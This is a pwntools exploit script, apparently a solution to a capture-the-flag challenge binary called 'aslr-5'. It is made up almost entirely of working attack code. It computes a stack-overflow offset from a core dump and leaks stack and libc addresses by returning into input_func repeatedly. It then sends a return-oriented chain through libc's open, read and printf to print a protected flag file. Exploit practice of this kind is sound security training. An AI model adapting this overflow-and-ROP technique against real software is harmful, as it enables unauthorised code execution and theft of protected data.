from pwn import *
import os

DEBUG = False 
file = "./aslr-5"
env = { "PATH":"$PATH:."} 
elf = ELF(file)
os.link("./flag", "./z")

io = process(file, env)
io.send(cyclic(1000))
io.wait()
core = io.corefile
max_len = cyclic(0x100).find(p32(core.eip))
print(max_len)
os.unlink(core.path)

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b main
b input_func
continue
''')
else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

input_func_addr = elf.symbols["input_func"]

payload = b"A" * max_len + p32(input_func_addr) +  b"A" * 3 
io.sendline(payload)

cont = io.recvuntil(b"!")
stack_addr = u32(cont[-6:-2])

print("stack_addr", hex(stack_addr))

payload = b"A" * max_len + p32(input_func_addr) +  b"A" * (4 * 9 + 3) 
io.sendline(payload)

cont = io.recvuntil(b"!")
libc_addr = u32(cont[-7:-3])
print("libc_addr", hex(libc_addr))

z_off = 0xf7ef5879 - 0xf7cf6fa1

open_off  = 0xf7de98c0 - 0xf7d1bfa1

read_off  = 0xf7de9e40 - 0xf7d1bfa1

printf_off = 0xf7d54520 - 0xf7d1bfa1
buf_off = 0xffc13fb0 - 0xffc14050

pop3 = p32(0x08048619)

payload = flat(
        b"A" * max_len,
        p32(libc_addr + open_off),
        pop3,
        p32(libc_addr + z_off),
        p32(0x0),
        p32(0x0),

        p32(libc_addr + read_off),
        p32(libc_addr + printf_off),
        p32(0x3),
        p32(stack_addr + buf_off),
        p32(max_len)
)
io.sendline(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
